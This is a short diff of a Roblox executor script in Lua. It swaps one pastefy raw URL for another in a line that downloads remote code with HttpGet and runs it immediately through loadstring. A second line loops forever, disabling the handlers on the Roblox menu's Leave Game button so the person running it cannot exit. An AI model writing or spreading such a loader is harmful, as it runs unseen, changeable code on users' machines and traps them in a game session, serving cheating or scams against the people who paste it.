@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://pastefy.app/LdkRbpJt/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/9RyffZJL/raw"))()
 task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
